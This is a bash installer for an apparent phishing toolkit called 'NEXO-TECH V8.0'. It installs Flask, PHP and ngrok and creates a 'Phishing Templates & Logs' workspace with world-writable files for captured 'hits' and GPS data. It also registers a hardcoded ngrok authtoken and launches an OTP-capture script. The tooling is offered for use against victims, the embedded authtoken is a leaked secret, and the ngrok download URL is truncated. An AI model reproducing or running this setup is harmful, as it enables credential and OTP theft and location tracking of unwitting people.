#!/bin/bash

# --- [ COLORS ] ---
G='\033[92m'
R='\033[91m'
C='\033[96m'
Y='\033[93m'
W='\033[0m'

clear
echo -e "${C}===================================================="
echo -e "       NEXO-TECH V8.0 | SYSTEM ARCHITECT CORE        "
echo -e "====================================================${W}"

# 1. REPAIR BROKEN REPOSITORIES (The "Missing Key" Fix)
echo -e "${Y}[*] Cleaning broken GPG keys & Ngrok repositories...${W}"
sudo rm -f /etc/apt/sources.list.d/ngrok.list
sudo rm -f /etc/apt/trusted.gpg.d/ngrok.asc
sudo rm -f /usr/share/keyrings/ngrok.gpg

# 2. INSTALL SYSTEM DEPENDENCIES
echo -e "${Y}[*] Installing system requirements (Python, PHP, Curl)...${W}"
sudo apt update -y
sudo apt install python3 python3-pip php wget tar curl -y

# 3. INSTALL PYTHON LIBRARIES (The "Traceback" Fix)
echo -e "${Y}[*] Injecting Python Modules (Flask, Phonenumbers, Requests)...${W}"
pip3 install flask requests phonenumbers --break-system-packages 2>/dev/null || pip3 install flask requests phonenumbers

# 4. DOWNLOAD & CONFIGURE NGROK BINARY (The "Path" Fix)
if [ -f "/usr/local/bin/ngrok" ]; then
    echo -e "${G}[!] Ngrok is already installed globally.${W}"
else
    echo -e "${Y}[*] Downloading Ngrok v3 Stable (AMD64)...${W}"
    wget -q -O ngrok.tgz "https://bin.equinox.io"
    tar -xvzf ngrok.tgz > /dev/null
    chmod +x ngrok
    sudo mv ngrok /usr/local/bin/
    rm ngrok.tgz
    echo -e "${G}[+] Ngrok Binary: INSTALLED TO /usr/local/bin${W}"
fi

# 5. CONFIGURE WORKSPACE
echo -e "${Y}[*] Setting up Phishing Templates & Logs...${W}"
mkdir -p templates
touch nexo_hits.txt nexo_gps.txt
chmod 777 nexo_hits.txt nexo_gps.txt

# 6. APPLY AUTHENTICATION
echo -e "${Y}[*] Synchronizing Ngrok Authtoken...${W}"
ngrok config add-authtoken 2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF

echo -e "${C}===================================================="
echo -e "${G}[+] INSTALLATION 100% COMPLETE!${W}"
echo -e "${Y}[!] ENSURE YOUR HTML FILES ARE IN THE 'templates' FOLDER${W}"
echo -e "${G}[>] START COMMAND:nexo-advanced_termux_otp-lock.py${W}"
echo -e "${C}====================================================${W}"
python3 nexo-advanced_termux_otp-lock.py
